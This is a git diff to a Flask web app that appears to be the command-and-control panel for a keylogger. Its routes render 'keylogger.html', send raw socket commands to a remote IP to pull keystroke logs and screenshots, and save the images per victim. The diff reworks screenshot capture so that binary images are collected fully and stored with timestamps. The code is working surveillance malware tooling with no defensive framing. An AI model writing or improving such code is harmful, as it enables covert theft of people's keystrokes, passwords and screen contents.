@@ -1,6 +1,7 @@
-from flask import Flask, render_template, request, redirect, url_for
+from flask import Flask, render_template, redirect, url_for, request, jsonify
 import socket
 import os
+import datetime
 
 app = Flask(__name__)
 
@@ -15,12 +16,43 @@ def send_command(ip, command):
         with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
             s.connect((ip, SERVER_PORT))
             s.sendall(command.encode())
-            if command.startswith("GET_LOG") or command.startswith("GET_IMAGE"):
-                data = s.recv(BUFFER_SIZE * 10)
-                return data.decode(errors="ignore")
+            if command.startswith("GET_IMAGE"):
+                # Esperar datos binarios (lee hasta que el servidor cierre)
+                data = b""
+                while True:
+                    packet = s.recv(BUFFER_SIZE)
+                    if not packet:
+                        break
+                    data += packet
+                return data  # Ya no .decode()
+            elif command.startswith("GET_LOG"):
+                return s.recv(BUFFER_SIZE * 10).decode(errors="ignore")
             return s.recv(BUFFER_SIZE).decode(errors="ignore")
     except Exception as e:
         return f"Error: {str(e)}"
+
+@app.route("/screenshot", methods=["POST"])
+def screenshot():
+    ip = request.get_json(force=True).get("ip")  # 🔥 fix aquí
+    response = send_command(ip, "GET_IMAGE")
+
+    ip_folder = os.path.join(UPLOAD_FOLDER, ip.replace('.', '_'))
+    os.makedirs(ip_folder, exist_ok=True)
+
+    timestamp = datetime.datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
+    filename = f"screenshot_{timestamp}.png"
+    full_path = os.path.join(ip_folder, filename)
+
+    with open(full_path, "wb") as f:
+        f.write(response)
+
+    screenshot_url = f"uploads/{ip.replace('.', '_')}/{filename}"
+    full_url = url_for('static', filename=screenshot_url) + f"?v={datetime.datetime.now().timestamp()}"
+
+    return jsonify({"screenshot": full_url})
+
+
+
 @app.route("/ ")
 def index():
     return render_template("keylogger.html")
@@ -54,15 +86,6 @@ def view_logs():
     ip = request.form.get("ip")
     response = send_command(ip, "GET_LOG")
     return render_template("keylogger.html", ip=ip, log=response)
-
-@app.route("/screenshot", methods=["POST"])
-def screenshot():
-    ip = request.form.get("ip")
-    response = send_command(ip, "GET_IMAGE")
-    filename = os.path.join(UPLOAD_FOLDER, f"screenshot_from_{ip.replace('.', '_')}.png")
-    with open(filename, "wb") as f:
-        f.write(response.encode())
-    return render_template("keylogger.html", ip=ip, screenshot=filename)
 
 @app.route("/delete", methods=["POST"])
 def delete():
